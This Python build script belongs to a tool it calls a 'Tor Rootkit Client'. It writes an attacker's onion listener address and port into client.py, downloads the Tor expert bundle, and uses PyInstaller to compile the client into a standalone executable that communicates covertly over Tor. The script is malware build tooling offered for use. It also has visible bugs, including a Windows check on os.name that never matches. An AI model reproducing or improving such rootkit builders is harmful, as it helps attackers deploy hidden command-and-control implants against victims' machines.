import PyInstaller.__main__
import requests
import os
import zipfile
import sys
from argparse import ArgumentParser


def getTorExpertBundle():
	# create directory for the tor expert bundle
	os.mkdir('torbundle')
	os.chdir('torbundle')
	
	# download tor expert bundle
	torURL = 'https://www.torproject.org/dist/torbrowser/10.0.13/tor-win32-0.4.5.6.zip'
	fileData = requests.get(torURL, allow_redirects=True)

	# write downloaded tor expert bundle
	try:
		file = open('tor.zip', 'wb')
		file.write(fileData.content)
	except Exception as error:
		print('[-] Error while writing tor expert bundle: {}'.format(error))
		sys.exit(1)
	else:
		print('[*] Wrote tor expert bundle to file')
	
	# unzip tor expert bundle
	try:
		file = zipfile.ZipFile('tor.zip')
		file.extractall('.')
	except Exception as error:
		print("[-] Error while unpacking tor library: {}".format('error'))
		sys.exit(1)
	else:
		print("[*] Unpacked Tor expert bundle")

	# change directory back to \client
	os.chdir('..')

def parse_args():
	parser = ArgumentParser(description='Python3 Tor Rootkit Client')
	parser.add_argument('onion', type=str, help='The remote onion address of the listener.')
	parser.add_argument('port', type=int, help='The remote hidden service port of the listener.')
	args = parser.parse_args()
	return args.onion, args.port


if __name__ == '__main__':
	onion, port = parse_args()
	# replace the onion and port line in client.py,
	# since if havent found a more elegant way to do this yet.
	lines = open('client.py').read().splitlines()
	# onion address is defined in line 6
	lines[5] = 'onion = "{}"'.format(onion)
	# onion port is defined in line 7
	lines[6] = 'port = {}'.format(port)
	# write modified script to file
	open('client.py','w').write('\n'.join(lines))

	print(os.name)

	if(os.name == 'posix'):
		PyInstaller.__main__.run([
			'client.py',
			'--onefile',
			'--add-data=torbundle:torbundle'
		])

	if(os.name == 'win'):
		print("WIN")
		# dont download everytime
		if not os.path.isdir('torbundle'):
			getTorExpertBundle()
		PyInstaller.__main__.run([
			'client.py',
			'--onefile',
			'--add-data=torbundle;torbundle'
		])
